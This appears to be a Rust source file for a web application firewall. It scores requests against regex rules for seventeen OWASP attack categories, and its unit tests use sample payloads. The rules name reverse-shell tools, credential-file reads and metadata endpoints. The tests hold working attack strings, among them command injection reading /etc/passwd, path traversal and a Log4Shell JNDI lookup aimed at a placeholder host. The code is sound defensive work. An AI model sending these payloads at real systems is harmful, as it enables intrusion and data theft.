//! OWASP 检测器框架 + 逐类检测。结构对齐 Go internal/waf/owasp：
//! 每类「indicator 预筛 → pattern 累加打分 → total >= threshold 出 Hit」。
//! 17 类共用 `compile` + `check_category` + 注册表驱动 `check_owasp`。

use std::sync::LazyLock;

use regex::Regex;

use crate::{Category, Hit, MAX_TARGET_LEN};

/// 单条检测规则（对齐 Go owaspPattern）。hint 非空时先用 contains 预筛再跑正则。
pub struct Pattern {
    pub re: Regex,
    pub score: i32,
    pub id: &'static str,
    pub hint: &'static str,
}

/// 非 panic 编译 pattern 数组（静态模式不会失败，失败则丢弃以遵守零 unwrap/expect）。
fn compile(rows: &[(&'static str, i32, &'static str, &'static str)]) -> Vec<Pattern> {
    rows.iter()
        .filter_map(|(p, score, id, hint)| {
            Regex::new(p).ok().map(|re| Pattern {
                re,
                score: *score,
                id,
                hint,
            })
        })
        .collect()
}

/// 类别阈值表（对齐 Go CategoryThreshold 的敏感度→阈值映射；细节全表保真留待后续 pass）。
/// 返回 None 表示该类别在此敏感度下禁用。阈值越低越严格。
pub fn category_threshold(sensitivity: &str, _category: Category) -> Option<i32> {
    match sensitivity.trim().to_lowercase().as_str() {
        "off" | "disabled" | "" => None,
        "strict" | "paranoid" => Some(2),
        "high" => Some(4),
        "medium" | "normal" => Some(6),
        "low" => Some(8),
        _ => Some(6),
    }
}

/// 泛型累加器（对齐 Go checkSQLi 等的打分逻辑）。
fn check_category(
    s: &str,
    threshold: i32,
    patterns: &[Pattern],
    category: Category,
    desc: &str,
) -> Option<Hit> {
    let mut total = 0;
    let mut best = "";
    for p in patterns {
        if !p.hint.is_empty() && !s.contains(p.hint) {
            continue;
        }
        if p.re.is_match(s) {
            total += p.score;
            if best.is_empty() {
                best = p.id;
            }
            if total >= threshold {
                return Some(Hit {
                    category,
                    rule_id: best.to_string(),
                    score: total,
                    desc: desc.to_string(),
                });
            }
        }
    }
    None
}

// ── SQLi ──

static SQLI_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"\bunion\b.{0,100}\bselect\b", 5, "owasp:sqli:001", "union"),
        (r"\bselect\b.{0,100}\bfrom\b", 4, "owasp:sqli:002", "select"),
        (r"\b(or|and)\s+\d+\s*=\s*\d+", 5, "owasp:sqli:003", ""),
        (r"'\s*(or|and)\s+'[^']*'\s*=\s*'", 5, "owasp:sqli:004", ""),
        (r"\border\s+by\s+\d+", 4, "owasp:sqli:019", "order"),
        (
            r"/\*!\d*\s*(select|union|insert|update|delete|drop|alter)\b",
            5,
            "owasp:sqli:020",
            "/*!",
        ),
        (
            r"\bwaitfor\s+delay\s*['\x22]",
            7,
            "owasp:sqli:035",
            "waitfor",
        ),
        (
            r"\bxp_(cmdshell|regread|regwrite|enumdsn)\b",
            6,
            "owasp:sqli:024",
            "xp_",
        ),
        (r"\bsleep\s*\(\s*\d+\s*\)", 5, "owasp:sqli:060", "sleep"),
        (r"\bbenchmark\s*\(\s*\d+", 5, "owasp:sqli:061", "benchmark"),
    ])
});

const SQLI_KEYWORDS: &[&str] = &[
    "select",
    "union",
    "insert",
    "update",
    "delete",
    "drop",
    "where",
    "from",
    "order",
    "group",
    "sleep",
    "benchmark",
    "waitfor",
    "xp_",
    "/*!",
    "or ",
    "and ",
    "'",
    "--",
];

/// SQLi 关键字预筛（对齐 Go hasSQLiIndicator 的 contains 思路；全 38 词留待后续补齐）。
pub fn has_sqli_indicator(s: &str) -> bool {
    SQLI_KEYWORDS.iter().any(|k| s.contains(k))
}

// ── XSS ──

static XSS_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"<script[\s>]", 6, "owasp:xss:001", "<script"),
        (r"javascript\s*:", 4, "owasp:xss:002", "javascript"),
        (
            r"on(error|load|mouseover|click|focus)\s*=",
            4,
            "owasp:xss:003",
            "on",
        ),
        (r"<svg[\s/>]", 3, "owasp:xss:004", "<svg"),
        (r"<img[^>]+onerror", 5, "owasp:xss:005", "<img"),
        (r"<iframe[\s>]", 4, "owasp:xss:006", "<iframe"),
        (r"expression\s*\(", 4, "owasp:xss:007", "expression"),
        (
            r"document\.(cookie|location)",
            3,
            "owasp:xss:008",
            "document",
        ),
    ])
});
const XSS_KEYWORDS: &[&str] = &[
    "<script",
    "javascript",
    "onerror",
    "onload",
    "onmouse",
    "onclick",
    "<img",
    "<svg",
    "<iframe",
    "expression(",
    "document.",
];

// ── CmdInjection ──

static CMD_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (
            r";\s*(cat|ls|id|whoami|uname|wget|curl|nc|bash|sh)\b",
            6,
            "owasp:cmd:001",
            ";",
        ),
        (
            r"\|\s*(cat|ls|id|whoami|nc|bash|sh)\b",
            5,
            "owasp:cmd:002",
            "|",
        ),
        (r"`[^`]+`", 4, "owasp:cmd:003", "`"),
        (r"\$\([^)]+\)", 4, "owasp:cmd:004", "$("),
        (
            r"&&\s*(cat|ls|id|whoami|nc|bash|sh)\b",
            4,
            "owasp:cmd:005",
            "&&",
        ),
        (r"/bin/(bash|sh|zsh|dash)\b", 5, "owasp:cmd:006", "/bin/"),
        (r"\b(wget|curl)\s+https?://", 4, "owasp:cmd:007", ""),
        (
            r"\bpowershell\b.{0,40}-(enc|e|command|c)\b",
            5,
            "owasp:cmd:008",
            "powershell",
        ),
    ])
});
const CMD_KEYWORDS: &[&str] = &[
    ";",
    "|",
    "&&",
    "`",
    "$(",
    "wget",
    "curl",
    "/bin/",
    "powershell",
    "bash",
    "nc ",
];

// ── PathTraversal ──

static LFI_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"\.\./\.\./", 5, "owasp:lfi:001", ".."),
        (r"\.\.[\\/]", 3, "owasp:lfi:002", ".."),
        (r"etc/passwd", 5, "owasp:lfi:003", "passwd"),
        (
            r"(proc/self|win\.ini|boot\.ini|/etc/shadow)",
            5,
            "owasp:lfi:004",
            "",
        ),
        (r"\.\.[\\/](etc|windows|proc|var)", 4, "owasp:lfi:005", ".."),
    ])
});
const LFI_KEYWORDS: &[&str] = &["../", "..\\", "passwd", "win.ini", "boot.ini", "/proc/"];

// ── SSRF ──

static SSRF_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (
            r"https?://(127\.0\.0\.1|localhost|0\.0\.0\.0|\[::1\])",
            5,
            "owasp:ssrf:001",
            "",
        ),
        (r"169\.254\.169\.254", 6, "owasp:ssrf:002", "169.254"),
        (r"(file|gopher|dict|ftp)://", 4, "owasp:ssrf:003", "://"),
        (
            r"(metadata\.google|/latest/meta-data)",
            6,
            "owasp:ssrf:004",
            "meta",
        ),
        (
            r"https?://(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)",
            4,
            "owasp:ssrf:005",
            "",
        ),
    ])
});
const SSRF_KEYWORDS: &[&str] = &[
    "127.0.0.1",
    "localhost",
    "169.254",
    "metadata",
    "file://",
    "gopher://",
    "dict://",
    "192.168",
    "meta-data",
];

// ── Webshell ──

static WEBSHELL_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"<\?php\b", 3, "owasp:webshell:001", "<?php"),
        (
            r"\b(eval|assert|system|exec|passthru|shell_exec|popen|proc_open)\s*\(",
            5,
            "owasp:webshell:002",
            "",
        ),
        (
            r"base64_decode\s*\(",
            4,
            "owasp:webshell:003",
            "base64_decode",
        ),
        (
            r"\$_(get|post|request|cookie|server)\b",
            3,
            "owasp:webshell:004",
            "$_",
        ),
        (
            r"preg_replace\s*\(.*/e",
            5,
            "owasp:webshell:005",
            "preg_replace",
        ),
        (
            r"create_function\s*\(",
            4,
            "owasp:webshell:006",
            "create_function",
        ),
        (
            r"call_user_func(_array)?\s*\(",
            3,
            "owasp:webshell:007",
            "call_user_func",
        ),
    ])
});
const WEBSHELL_KEYWORDS: &[&str] = &[
    "<?php",
    "eval(",
    "assert(",
    "system(",
    "exec(",
    "passthru",
    "shell_exec",
    "base64_decode",
    "$_",
    "preg_replace",
    "create_function",
    "call_user_func",
];

// ── RevShell ──

static REVSHELL_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"bash\s+-i\b", 6, "owasp:revshell:001", "bash"),
        (r"/dev/tcp/", 6, "owasp:revshell:002", "/dev/tcp"),
        (r"\bnc(at)?\b.{0,30}-e\b", 6, "owasp:revshell:003", "nc"),
        (r"mkfifo\b", 4, "owasp:revshell:004", "mkfifo"),
        (
            r"python[0-9]?\s+-c\b.{0,80}socket",
            6,
            "owasp:revshell:005",
            "python",
        ),
        (r"pty\.spawn", 5, "owasp:revshell:006", "pty"),
        (r"perl\s+-e\b.{0,80}socket", 6, "owasp:revshell:007", "perl"),
    ])
});
const REVSHELL_KEYWORDS: &[&str] = &[
    "/dev/tcp",
    "bash -i",
    "nc ",
    "ncat",
    "mkfifo",
    "python",
    "perl ",
    "pty.spawn",
    "socket",
];

// ── XXE ──

static XXE_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"<!entity\b", 5, "owasp:xxe:001", "<!entity"),
        (r"<!doctype[^>]+system", 6, "owasp:xxe:002", "<!doctype"),
        (r"<!entity[^>]+system", 6, "owasp:xxe:003", "<!entity"),
        (r"<!doctype[^>]+\[", 4, "owasp:xxe:004", "<!doctype"),
    ])
});
const XXE_KEYWORDS: &[&str] = &["<!entity", "<!doctype"];

// ── LdapInjection ──

static LDAP_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"\(\|\(", 4, "owasp:ldap:001", "(|("),
        (r"\)\(\|", 4, "owasp:ldap:002", ")(|"),
        (r"\(\&\(", 4, "owasp:ldap:003", "(&("),
        (r"\*\)\(", 5, "owasp:ldap:004", "*)("),
        (r"objectclass=\*", 4, "owasp:ldap:005", "objectclass"),
    ])
});
const LDAP_KEYWORDS: &[&str] = &["(|(", ")(", "(&(", "*)(", "objectclass"];

// ── FileUpload ──

static FILEUPLOAD_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (
            r"filename\s*=\s*[\x22']?[^\x22']*\.(php[3457s]?|phtml|phar)\b",
            6,
            "owasp:upload:001",
            "filename",
        ),
        (
            r"filename\s*=\s*[\x22']?[^\x22']*\.(jspx?|jspf|war)\b",
            6,
            "owasp:upload:002",
            "filename",
        ),
        (
            r"filename\s*=\s*[\x22']?[^\x22']*\.(aspx?|ashx|asmx)\b",
            6,
            "owasp:upload:003",
            "filename",
        ),
        (
            r"filename\s*=\s*[\x22']?[^\x22']*\.(exe|dll|sh|bat|cmd)\b",
            5,
            "owasp:upload:004",
            "filename",
        ),
    ])
});
const FILEUPLOAD_KEYWORDS: &[&str] = &["filename"];

// ── ProtocolViolation ──

static PROTO_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (
            r"transfer-encoding\s*:\s*chunked.{0,40}content-length\s*:",
            5,
            "owasp:proto:001",
            "transfer-encoding",
        ),
        (
            r"[\r\n]\s*(host|content-length|transfer-encoding)\s*:",
            4,
            "owasp:proto:002",
            "",
        ),
    ])
});
const PROTO_KEYWORDS: &[&str] = &["transfer-encoding", "content-length"];

// ── NoSqlInjection ──

static NOSQL_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"\$where\b", 6, "owasp:nosql:001", "$where"),
        (
            r"\$(ne|gt|lt|gte|lte|in|nin|regex|exists|or|and)\b",
            4,
            "owasp:nosql:002",
            "$",
        ),
        (r"\[\$(ne|gt|lt|regex|where)\]", 5, "owasp:nosql:003", "[$"),
        (r"\{\s*\$where\s*:", 6, "owasp:nosql:004", "$where"),
    ])
});
const NOSQL_KEYWORDS: &[&str] = &["$where", "$ne", "$gt", "$regex", "$or", "$in", "[$"];

// ── TemplateInjection ──

static SSTI_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"\{\{\s*\d+\s*\*\s*\d+\s*\}\}", 5, "owasp:ssti:001", "{{"),
        (
            r"\{\{.{0,40}(\.__|config|self|request|cycler).{0,40}\}\}",
            5,
            "owasp:ssti:002",
            "{{",
        ),
        (r"\$\{.{0,40}\}", 4, "owasp:ssti:003", "${"),
        (r"#\{.{0,40}\}", 4, "owasp:ssti:004", "#{"),
        (r"<%=.{0,40}%>", 4, "owasp:ssti:005", "<%"),
    ])
});
const SSTI_KEYWORDS: &[&str] = &["{{", "${", "#{", "<%"];

// ── JndiInjection ──

static JNDI_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"\$\{jndi:", 8, "owasp:jndi:001", "${jndi"),
        (
            r"jndi:(ldap|rmi|dns|ldaps|iiop|corba|nis):",
            8,
            "owasp:jndi:002",
            "jndi:",
        ),
        (
            r"\$\{(lower|upper|env|sys|date):",
            5,
            "owasp:jndi:003",
            "${",
        ),
    ])
});
const JNDI_KEYWORDS: &[&str] = &["${jndi", "jndi:", "${lower", "${upper", "${env"];

// ── CrlfInjection ──

static CRLF_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (
            r"[\r\n]+\s*(set-cookie|location|content-type|content-length|refresh)\s*:",
            5,
            "owasp:crlf:001",
            "",
        ),
        (r"%0d%0a", 4, "owasp:crlf:002", "%0d"),
        (r"[\r\n]\s*\w+\s*:", 3, "owasp:crlf:003", ""),
    ])
});
const CRLF_KEYWORDS: &[&str] = &["\r", "\n", "%0d", "%0a", "set-cookie", "location"];

// ── ExpressionLanguage ──

static EL_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (
            r"\$\{.{0,60}(getruntime|runtime|exec|getclass)\b",
            6,
            "owasp:el:001",
            "${",
        ),
        (r"#\{.{0,60}(getruntime|exec|t\()", 6, "owasp:el:002", "#{"),
        (r"t\(java\.lang\.runtime\)", 7, "owasp:el:003", "t(java"),
        (r"\bognl\b", 4, "owasp:el:004", "ognl"),
    ])
});
const EL_KEYWORDS: &[&str] = &["${", "#{", "getruntime", "ognl", "t(java"];

// ── Deserialization ──

static DESER_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"ro0ab", 6, "owasp:deser:001", "ro0ab"),
        (r"aced0005", 6, "owasp:deser:002", "aced"),
        (
            r"java\.lang\.(runtime|processbuilder)",
            5,
            "owasp:deser:003",
            "java.lang",
        ),
        (
            r"objectinputstream",
            5,
            "owasp:deser:004",
            "objectinputstream",
        ),
        (
            r"__reduce__|__reduce_ex__",
            5,
            "owasp:deser:005",
            "__reduce",
        ),
        (r"!!python/object", 6, "owasp:deser:006", "!!python"),
    ])
});
const DESER_KEYWORDS: &[&str] = &[
    "ro0ab",
    "aced",
    "java.lang",
    "objectinputstream",
    "__reduce",
    "!!python",
];

// ── GraphqlInjection ──

static GRAPHQL_PATTERNS: LazyLock<Vec<Pattern>> = LazyLock::new(|| {
    compile(&[
        (r"__schema\b", 4, "owasp:graphql:001", "__schema"),
        (r"\b__type\s*\(", 4, "owasp:graphql:002", "__type"),
        (
            r"introspectionquery",
            4,
            "owasp:graphql:003",
            "introspection",
        ),
        (
            r"query\s+introspection",
            4,
            "owasp:graphql:004",
            "introspection",
        ),
        (r"\{\s*__schema\s*\{", 5, "owasp:graphql:005", "__schema"),
    ])
});
const GRAPHQL_KEYWORDS: &[&str] = &["__schema", "__type", "introspection"];

/// 通用关键字预筛：空表视为无预筛（始终跑正则）。
fn has_indicator(s: &str, keywords: &[&str]) -> bool {
    keywords.is_empty() || keywords.iter().any(|k| s.contains(k))
}

/// 单类检测定义（注册表条目）。对齐 Go 的 per-category check 函数。
struct CategoryDef {
    category: Category,
    patterns: &'static LazyLock<Vec<Pattern>>,
    keywords: &'static [&'static str],
    desc: &'static str,
}

/// 全类别注册表（对齐 Go owaspRegistry：每类 indicator → patterns → desc）。
static REGISTRY: LazyLock<Vec<CategoryDef>> = LazyLock::new(|| {
    vec![
        CategoryDef {
            category: Category::Sqli,
            patterns: &SQLI_PATTERNS,
            keywords: SQLI_KEYWORDS,
            desc: "SQL injection signals",
        },
        CategoryDef {
            category: Category::Xss,
            patterns: &XSS_PATTERNS,
            keywords: XSS_KEYWORDS,
            desc: "Cross-site scripting signals",
        },
        CategoryDef {
            category: Category::CmdInjection,
            patterns: &CMD_PATTERNS,
            keywords: CMD_KEYWORDS,
            desc: "Command injection signals",
        },
        CategoryDef {
            category: Category::PathTraversal,
            patterns: &LFI_PATTERNS,
            keywords: LFI_KEYWORDS,
            desc: "Path traversal signals",
        },
        CategoryDef {
            category: Category::Ssrf,
            patterns: &SSRF_PATTERNS,
            keywords: SSRF_KEYWORDS,
            desc: "Server-side request forgery signals",
        },
        CategoryDef {
            category: Category::Webshell,
            patterns: &WEBSHELL_PATTERNS,
            keywords: WEBSHELL_KEYWORDS,
            desc: "Webshell signals",
        },
        CategoryDef {
            category: Category::RevShell,
            patterns: &REVSHELL_PATTERNS,
            keywords: REVSHELL_KEYWORDS,
            desc: "Reverse shell signals",
        },
        CategoryDef {
            category: Category::Xxe,
            patterns: &XXE_PATTERNS,
            keywords: XXE_KEYWORDS,
            desc: "XML external entity signals",
        },
        CategoryDef {
            category: Category::LdapInjection,
            patterns: &LDAP_PATTERNS,
            keywords: LDAP_KEYWORDS,
            desc: "LDAP injection signals",
        },
        CategoryDef {
            category: Category::FileUpload,
            patterns: &FILEUPLOAD_PATTERNS,
            keywords: FILEUPLOAD_KEYWORDS,
            desc: "Dangerous file upload signals",
        },
        CategoryDef {
            category: Category::ProtocolViolation,
            patterns: &PROTO_PATTERNS,
            keywords: PROTO_KEYWORDS,
            desc: "HTTP protocol violation signals",
        },
        CategoryDef {
            category: Category::NoSqlInjection,
            patterns: &NOSQL_PATTERNS,
            keywords: NOSQL_KEYWORDS,
            desc: "NoSQL injection signals",
        },
        CategoryDef {
            category: Category::TemplateInjection,
            patterns: &SSTI_PATTERNS,
            keywords: SSTI_KEYWORDS,
            desc: "Server-side template injection signals",
        },
        CategoryDef {
            category: Category::JndiInjection,
            patterns: &JNDI_PATTERNS,
            keywords: JNDI_KEYWORDS,
            desc: "JNDI injection signals",
        },
        CategoryDef {
            category: Category::CrlfInjection,
            patterns: &CRLF_PATTERNS,
            keywords: CRLF_KEYWORDS,
            desc: "CRLF injection signals",
        },
        CategoryDef {
            category: Category::ExpressionLanguage,
            patterns: &EL_PATTERNS,
            keywords: EL_KEYWORDS,
            desc: "Expression language injection signals",
        },
        CategoryDef {
            category: Category::Deserialization,
            patterns: &DESER_PATTERNS,
            keywords: DESER_KEYWORDS,
            desc: "Insecure deserialization signals",
        },
        CategoryDef {
            category: Category::GraphqlInjection,
            patterns: &GRAPHQL_PATTERNS,
            keywords: GRAPHQL_KEYWORDS,
            desc: "GraphQL injection signals",
        },
    ]
});

/// 检测主入口：对每个目标归一化后逐类遍历注册表（阈值禁用则跳过，关键字预筛后跑打分）。
pub fn check_owasp(sensitivity: &str, targets: &[String]) -> Vec<Hit> {
    let mut hits = Vec::new();
    for raw in targets {
        if raw.is_empty() {
            continue;
        }
        let mut s = crate::normalize::normalize_with_decode(raw);
        if s.len() > MAX_TARGET_LEN {
            s.truncate(MAX_TARGET_LEN);
        }
        for def in REGISTRY.iter() {
            let Some(th) = category_threshold(sensitivity, def.category) else {
                continue;
            };
            if !has_indicator(&s, def.keywords) {
                continue;
            }
            if let Some(hit) = check_category(&s, th, def.patterns, def.category, def.desc) {
                hits.push(hit);
            }
        }
    }
    hits
}

/// 请求级检测入口（对齐 Go CheckOWASP）：path/query/headers → collect_targets，并入 body_targets 后逐类扫描。
pub fn check_request(
    sensitivity: &str,
    path: &str,
    query: &str,
    headers: &[(String, String)],
    body_targets: &[String],
) -> Vec<Hit> {
    // 裸 CR/LF 在归一化前提早判定（normalize 会折叠空白，事后无法检出）。
    if category_threshold(sensitivity, Category::CrlfInjection).is_some()
        && (path.contains(['\r', '\n']) || path.contains("%0d") || path.contains("%0a"))
    {
        return vec![Hit {
            category: Category::CrlfInjection,
            rule_id: "owasp:crlf:005".to_string(),
            score: 5,
            desc: "bare CR/LF in URL path".to_string(),
        }];
    }
    let mut targets = crate::targets::collect_targets(path, query, headers);
    targets.extend_from_slice(body_targets);
    check_owasp(sensitivity, &targets)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn request_xss_in_query_blocked() {
        let hits = check_request("medium", "/", "q=<script>alert(1)</script>", &[], &[]);
        assert!(hits.iter().any(|h| h.category == Category::Xss));
    }

    #[test]
    fn request_bare_crlf_in_path_blocked() {
        let hits = check_request("medium", "/a%0d%0aset-cookie:x", "", &[], &[]);
        assert!(hits.iter().any(|h| h.category == Category::CrlfInjection));
    }

    #[test]
    fn sqli_union_select_blocked_at_medium() {
        let hits = check_owasp(
            "medium",
            &["id=1 union select password from users".to_string()],
        );
        assert!(hits.iter().any(|h| h.category == Category::Sqli));
    }

    #[test]
    fn clean_input_no_hit() {
        let hits = check_owasp("medium", &["name=john&age=30".to_string()]);
        assert!(hits.is_empty());
    }

    #[test]
    fn off_disables_category() {
        assert!(category_threshold("off", Category::Sqli).is_none());
    }

    #[test]
    fn xss_script_tag_blocked() {
        let hits = check_owasp("medium", &["q=<script>alert(1)</script>".to_string()]);
        assert!(hits.iter().any(|h| h.category == Category::Xss));
    }

    #[test]
    fn cmd_injection_pipe_blocked() {
        let hits = check_owasp("medium", &["host=127.0.0.1; cat /etc/passwd".to_string()]);
        assert!(hits.iter().any(|h| h.category == Category::CmdInjection));
    }

    #[test]
    fn path_traversal_blocked() {
        let hits = check_owasp("medium", &["file=../../etc/passwd".to_string()]);
        assert!(hits.iter().any(|h| h.category == Category::PathTraversal));
    }

    #[test]
    fn jndi_log4shell_blocked() {
        let hits = check_owasp("medium", &["x=${jndi:ldap://evil/a}".to_string()]);
        assert!(hits.iter().any(|h| h.category == Category::JndiInjection));
    }

    #[test]
    fn nosql_where_blocked() {
        let hits = check_owasp("medium", &["{ \"$where\": \"1==1\" }".to_string()]);
        assert!(hits.iter().any(|h| h.category == Category::NoSqlInjection));
    }
}
